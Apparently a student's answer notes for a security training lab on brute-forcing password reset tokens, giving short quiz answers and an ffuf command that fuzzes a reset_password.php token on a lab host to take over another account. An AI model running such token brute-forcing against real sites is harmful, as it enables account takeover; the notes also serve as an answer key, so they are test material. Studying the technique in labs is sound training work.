# [Brute-Forcing Password Reset Tokens](Brute-Forcing%20Password%20Reset%20Tokens.md)
### On what do password recovery functionalities provided by web applications typically rely to allow users to recover their accounts?

one-time reset token
### Which flag of seq pads numbers by prepending zeros to make them the same length?

-w
### How many possible values are there for a 6-digit OTP?

100 000
### Takeover another user's account on the target system to obtain the flag.

```sh
ffuf -w ./tokens.txt -u http://154.57.164.73:32603/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
![](Screenshot%202026-09-14%20at%2008.44.28.png)![](Screenshot%202026-09-14%20at%2008.44.50.png)